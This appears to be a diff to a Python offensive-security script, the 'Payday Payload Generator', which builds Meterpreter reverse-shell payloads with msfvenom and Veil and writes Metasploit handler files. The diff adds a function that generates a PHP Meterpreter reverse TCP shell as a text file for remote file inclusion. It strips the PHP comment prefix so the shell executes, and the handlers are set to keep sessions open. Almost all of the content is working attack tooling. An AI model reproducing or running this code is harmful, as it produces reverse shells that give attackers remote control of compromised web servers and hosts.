@@ -6,7 +6,7 @@ import os, sys, time, argparse
 
 def banner():
 
-	version = "the beanster edition"
+	version = "the kitchen sink edition"
     
 	banner = """
                        _
@@ -56,6 +56,7 @@ def msf_payloads(ip, output_dir):
 		handler_file.write("set payload " + payload +"\n")
 		handler_file.write("set LPORT 443\n")
 		handler_file.write("set LHOST " + ip + "\n")
+		handler_file.write("set ExitOnSession False\n")
 		handler_file.write("exploit -j -z\n")
 		handler_file.close()
 		print "[!] Generated : " + yellowtxt(handler) + "\n\n"
@@ -93,6 +94,53 @@ def veil_payloads(ip, output_dir, move_payloads):
 			# move handler
 			os.system("mv /root/payloads/windows/handlers/" + output + "_handler.rc " + output_dir + "handlers")
 
+def php_payloads(ip, output_dir):
+	""" Creates PHP based raw shell and outputs as txt ready for RFI """
+	payloads = []
+	payloads.append(["php/meterpreter/reverse_tcp", 443, "raw" ,"pshell.txt"])
+	# TODO : push out the payload generation to a dedicated function to remove the code duplication
+	for parms in payloads:
+		lhost = ip
+		payload = parms[0]
+		lport = str(parms[1])
+		output_type = parms[2]
+		ext = parms[3]
+		base = output_dir
+		venom_cmd = "msfvenom -p " + payload + " LHOST=" + ip + " LPORT=" + lport + " -f " + output_type + " -o " + base + ext
+		print "[!] Generating : " + bluetxt(payload)
+		os.system(venom_cmd)
+		print "[!] Generating handler for : " + bluetxt(payload)
+		# strip off ext and replace with .rc
+
+		handler = ext.split(".")[0] + ".rc"
+		handler_file = open(base + "handlers/" + handler , "w")
+		handler_file.write("use exploit/multi/handler\n")
+		handler_file.write("set payload " + payload +"\n")
+		handler_file.write("set LPORT 443\n")
+		handler_file.write("set LHOST " + ip + "\n")
+		handler_file.write("set ExitOnSession False\n")
+		handler_file.write("exploit -j -z\n")
+		handler_file.close()
+		print "[!] Generated : " + yellowtxt(handler) + "\n\n"
+	
+	# close this file and then move to backup - crazy stuff to get around read/write/edit locks
+	orig_file = str(base + ext)
+	backup_file = orig_file + '.bak'
+	os.rename(orig_file, backup_file)
+	# now open this file and remove the comments in php so that the file works
+	holding = open(backup_file, 'r')
+	new_file = open(orig_file, 'w')
+	lines = holding.readlines()
+	for line in lines: 
+		if line.startswith('/*<?php /**/'):
+			line = line.replace('/*<?php /**/', '<?php')
+			new_file.write(line)
+		new_file.close()
+	holding.close()
+	os.remove(str(backup_file))
+
+
+
 
 def clean(payload_path):
 	""" Cleans out directory """
@@ -128,7 +176,7 @@ def get_payload_output(payload_output_dir):
 
 
 ###############################
-### 	Helper Functions	###
+### 	Helper Function	    ###
 ###############################
 
 def redtxt(text2colour):
@@ -154,22 +202,26 @@ def bluetxt(text2colour):
 
 
 ##############################
-##		 Main Function	   ###
+##	 Main Function	   ###
 ##############################
 
 
 def Main():
 	# program version
-	version = 0.3
+	version = 0.4
 	banner()
 	default_path = '/root/payloads/windows'
 
 	parser = argparse.ArgumentParser(description="Payday Payload Generator :: Takes the IP Address and then builds meterpreter windows payloads using msfvenom and veil. Outputs to '/root/payloads/windows/' by default.")
 	parser.add_argument("--veil", action="store_true", help='Veil Payloads')
 	parser.add_argument("--msf", action="store_true", help='MSF Payloads > tcp/exe, tcp/http(s), exe-service, dll')
+	parser.add_argument("--php", action="store_true", help='Creates PHP payload as txt file for LFI/RFI')
 	parser.add_argument("--clean", action="store_true", help="Cleans out existing files in the output directory")
 	parser.add_argument("--output", help="Specify new output directory.")
 	parser.add_argument("--ip", help='Specify Local IP Address for reverse connections')
+	
+	
+
 
 	# counts the supplied number of arguments and prints help if they are missing
 	if len(sys.argv)==1:
@@ -202,6 +254,13 @@ def Main():
 			#os.chdir(output_dir)
 			#os.mkdir('handlers')
 
+	if args.veil:
+		if not ip:
+			print "[!] IP address required with this payload option :: --veil --ip <Address>"
+		else:
+			print yellowtxt("[!] Encoding Veil payloads")
+			veil_payloads(ip ,output_dir, move_payloads)
+
 
 	if args.msf:
 		if not ip:
@@ -210,12 +269,15 @@ def Main():
 			print yellowtxt("[!] Encoding MSF Payloads")
 			msf_payloads(ip, output_dir)
 
-	if args.veil:
+
+	if args.php:
 		if not ip:
-			print "[!] IP address required with this payload option :: --veil --ip <Address>"
+			print "[!] IP address required with this payload option :: --php --ip <Address>"
 		else:
-			print yellowtxt("[!] Encoding Veil payloads")
-			veil_payloads(ip ,output_dir, move_payloads)
+			print yellowtxt("[!] Encoding PHP Payloads")
+			php_payloads(ip, output_dir)
+
+
 
 	if args.clean:
 		if args.output:
